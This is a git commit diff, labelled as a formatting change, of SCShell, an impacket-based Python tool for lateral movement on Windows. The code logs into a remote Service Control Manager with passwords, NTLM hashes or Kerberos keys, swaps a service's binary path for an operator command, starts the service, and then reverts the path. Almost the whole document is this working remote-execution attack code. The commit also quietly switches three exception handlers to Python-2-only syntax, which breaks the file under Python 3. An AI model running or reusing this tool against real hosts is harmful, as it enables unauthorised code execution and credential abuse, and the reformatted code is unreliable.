654f86e1789dcfed7356dfaf61b3e5aa7496623d
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2019-11-19 11:47:04 -0500

    formatting tab

--- examples/scshell.py
+++ examples/scshell.py
@@ -11,6 +11,7 @@
 # Reference for:
 #  DCE/RPC
 #
+
 from __future__ import division
 from __future__ import print_function
 import sys
@@ -31,10 +32,11 @@ from impacket.dcerpc.v5 import transport, scmr, epm
 from impacket.dcerpc.v5.ndr import NULL
 from impacket import ntlm
 
+
 def capture_input(prompt):
     data = ''
     sys.stdout.write(prompt)
-    
+
     while True:
         c = sys.stdin.read(1)
         if not ord(c) == 10:
@@ -44,8 +46,17 @@ def capture_input(prompt):
 
 
 class SCSHELL:
-    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None,
-                 doKerberos=None, kdcHost=None):
+
+    def __init__(
+        self,
+        username='',
+        password='',
+        domain='',
+        hashes=None,
+        aesKey=None,
+        doKerberos=None,
+        kdcHost=None,
+        ):
 
         self.__username = username
         self.__password = password
@@ -58,22 +69,35 @@ class SCSHELL:
         self.__kdcHost = kdcHost
         self.__scmr = None
         if hashes is not None:
-            self.__lmhash, self.__nthash = hashes.split(':')
+            (self.__lmhash, self.__nthash) = hashes.split(':')
 
-    def run(self, remoteName, remoteHost, serviceName, noCmd):
+    def run(
+        self,
+        remoteName,
+        remoteHost,
+        serviceName,
+        noCmd,
+        ):
         exitCli = False
-        stringBinding = epm.hept_map(remoteName, scmr.MSRPC_UUID_SCMR, protocol = 'ncacn_ip_tcp')
+        stringBinding = epm.hept_map(remoteName, scmr.MSRPC_UUID_SCMR,
+                protocol='ncacn_ip_tcp')
         rpctransport = transport.DCERPCTransportFactory(stringBinding)
-        logging.debug("binding to %s" % stringBinding)
-        rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
-                                         self.__nthash, self.__aesKey)
+        logging.debug('binding to %s' % stringBinding)
+        rpctransport.set_credentials(
+            self.__username,
+            self.__password,
+            self.__domain,
+            self.__lmhash,
+            self.__nthash,
+            self.__aesKey,
+            )
         rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
 
         self.__scmr = rpctransport.get_dce_rpc()
-	self.__scmr.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
+        self.__scmr.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
         try:
             self.__scmr.connect()
-        except Exception as e:
+        except Exception, e:
             logging.critical(str(e))
             sys.exit(1)
 
@@ -88,71 +112,126 @@ class SCSHELL:
 
         resp = scmr.hRQueryServiceConfigW(self.__scmr, serviceHandle)
         binaryPath = resp['lpServiceConfig']['lpBinaryPathName']
-        logging.debug('(%s) Current service binary path %s' % (serviceName, binaryPath)) 
+        logging.debug('(%s) Current service binary path %s'
+                      % (serviceName, binaryPath))
 
-        logging.info('Command need to use FULL path. No command output.')
+        logging.info('Command need to use FULL path. No command output.'
+                     )
         while not exitCli:
-          userCommand = capture_input('SCShell>')
-          if not userCommand == 'exit':
-            if not noCmd:
-               userCommand = 'C:\windows\system32\cmd.exe /c %s' % userCommand
-            logging.debug('(%s) Updating service binary path to %s' % (serviceName, userCommand))
-            resp = scmr.hRChangeServiceConfigW(self.__scmr, serviceHandle, scmr.SERVICE_NO_CHANGE, scmr.SERVICE_DEMAND_START, scmr.SERVICE_ERROR_IGNORE, userCommand, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL)
+            userCommand = capture_input('SCShell>')
+            if not userCommand == 'exit':
+                if not noCmd:
+                    userCommand = 'C:\windows\system32\cmd.exe /c %s' \
+                        % userCommand
+                logging.debug('(%s) Updating service binary path to %s'
+                              % (serviceName, userCommand))
+                resp = scmr.hRChangeServiceConfigW(
+                    self.__scmr,
+                    serviceHandle,
+                    scmr.SERVICE_NO_CHANGE,
+                    scmr.SERVICE_DEMAND_START,
+                    scmr.SERVICE_ERROR_IGNORE,
+                    userCommand,
+                    NULL,
+                    NULL,
+                    NULL,
+                    NULL,
+                    NULL,
+                    NULL,
+                    NULL,
+                    NULL,
+                    )
 
-            logging.debug('Starting service %s' % serviceName)
-            try:
-               scmr.hRStartServiceW(self.__scmr, serviceHandle)
-            except Exception as e:
-               error = str(e)
+                logging.debug('Starting service %s' % serviceName)
+                try:
+                    scmr.hRStartServiceW(self.__scmr, serviceHandle)
+                except Exception, e:
+                    error = str(e)
 
-               # ignoring error 1053 ERROR_SERVICE_REQUEST_TIMEOUT since it will happen if the target binary is not a service
-               if error.find('ERROR_SERVICE_REQUEST_TIMEOUT') == -1:
-                   logging.critical(error)
+                    # ignoring error 1053 ERROR_SERVICE_REQUEST_TIMEOUT since it will happen if the target binary is not a service
 
-            time.sleep(5)
-            logging.debug('(%s) Reverting binary path to %s' % (serviceName, binaryPath))
-            resp = scmr.hRChangeServiceConfigW(self.__scmr, serviceHandle, scmr.SERVICE_NO_CHANGE, scmr.SERVICE_DEMAND_START, scmr.SERVICE_ERROR_IGNORE, binaryPath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL)
-            logging.info('Command Executed')
-          else:
-            exitCli = True
-            
+                    if error.find('ERROR_SERVICE_REQUEST_TIMEOUT') \
+                        == -1:
+                        logging.critical(error)
+
+                time.sleep(5)
+                logging.debug('(%s) Reverting binary path to %s'
+                              % (serviceName, binaryPath))
+                resp = scmr.hRChangeServiceConfigW(
+                    self.__scmr,
+                    serviceHandle,
+                    scmr.SERVICE_NO_CHANGE,
+                    scmr.SERVICE_DEMAND_START,
+                    scmr.SERVICE_ERROR_IGNORE,
+                    binaryPath,
+                    NULL,
+                    NULL,
+                    NULL,
+                    NULL,
+                    NULL,
+                    NULL,
+                    NULL,
+                    NULL,
+                    )
+                logging.info('Command Executed')
+            else:
+                exitCli = True
+
         scmr.hRCloseServiceHandle(self.__scmr, serviceHandle)
         scmr.hRCloseServiceHandle(self.__scmr, scHandle)
 
         self.__scmr.disconnect()
 
+
 # Process command-line arguments.
+
 if __name__ == '__main__':
+
     # Init the example's logger theme
+
     logger.init()
     print(version.BANNER)
 
     parser = argparse.ArgumentParser()
 
-    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
-    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-    parser.add_argument('-service-name', action='store', default='XblAuthManager', help='Targeted service (default to: XblAuthManager)')
-    parser.add_argument('-no-cmd', action='store', default=False, help='Prepend C:\windows\system32\cmd.exe /c in front of your command')
+    parser.add_argument('target', action='store',
+                        help='[[domain/]username[:password]@]<targetName or address>'
+                        )
+    parser.add_argument('-debug', action='store_true',
+                        help='Turn DEBUG output ON')
+    parser.add_argument('-service-name', action='store',
+                        default='XblAuthManager',
+                        help='Targeted service (default to: XblAuthManager)'
+                        )
+    parser.add_argument('-no-cmd', action='store', default=False,
+                        help='Prepend C:\windows\system32\cmd.exe /c in front of your command'
+                        )
     group = parser.add_argument_group('connection')
 
-    group.add_argument('-dc-ip', action='store',metavar = "ip address", help='IP Address of the domain controller. '
-                       'If omitted it will use the domain part (FQDN) specified in the target parameter')
-    group.add_argument('-target-ip', action='store', metavar="ip address", help='IP Address of the target machine. If '
-                       'ommited it will use whatever was specified as target. This is useful when target is the NetBIOS '
-                       'name and you cannot resolve it')
+    group.add_argument('-dc-ip', action='store', metavar='ip address',
+                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter'
+                       )
+    group.add_argument('-target-ip', action='store',
+                       metavar='ip address',
+                       help='IP Address of the target machine. If ommited it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it'
+                       )
 
     group = parser.add_argument_group('authentication')
 
-    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
-    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
-    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
-                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
-                       'ones specified in the command line')
-    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
-                                                                            '(128 or 256 bits)')
+    group.add_argument('-hashes', action='store',
+                       metavar='LMHASH:NTHASH',
+                       help='NTLM hashes, format is LMHASH:NTHASH')
+    group.add_argument('-no-pass', action='store_true',
+                       help='don\'t ask for password (useful for -k)')
+    group.add_argument('-k', action='store_true',
+                       help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line'
+                       )
 
+    group.add_argument('-aesKey', action='store', metavar='hex key',
+                       help='AES key to use for Kerberos Authentication (128 or 256 bits)'
+                       )
 
-    if len(sys.argv)==1:
+    if len(sys.argv) == 1:
         parser.print_help()
         sys.exit(1)
 
@@ -164,9 +243,12 @@ if __name__ == '__main__':
         logging.getLogger().setLevel(logging.INFO)
 
     import re
-    domain, username, password, remoteName = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')
+    (domain, username, password, remoteName) = \
+        re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)'
+                   ).match(options.target).groups('')
 
-    #In case the password contains '@'
+    # In case the password contains '@'
+
     if '@' in remoteName:
         password = password + '@' + remoteName.rpartition('@')[0]
         remoteName = remoteName.rpartition('@')[2]
@@ -174,9 +256,10 @@ if __name__ == '__main__':
     if domain is None:
         domain = ''
 
-    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
+    if password == '' and username != '' and options.hashes is None \
+        and options.no_pass is False and options.aesKey is None:
         from getpass import getpass
-        password = getpass("Password:")
+        password = getpass('Password:')
 
     if options.target_ip is None:
         options.target_ip = remoteName
@@ -185,10 +268,18 @@ if __name__ == '__main__':
         options.k = True
 
     try:
-        executer = SCSHELL(username, password, domain, options.hashes, options.aesKey, options.k,
-                           options.dc_ip)
-        executer.run(remoteName, options.target_ip, options.service_name, options.no_cmd)
-    except Exception as e:
+        executer = SCSHELL(
+            username,
+            password,
+            domain,
+            options.hashes,
+            options.aesKey,
+            options.k,
+            options.dc_ip,
+            )
+        executer.run(remoteName, options.target_ip,
+                     options.service_name, options.no_cmd)
+    except Exception, e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
             traceback.print_exc()
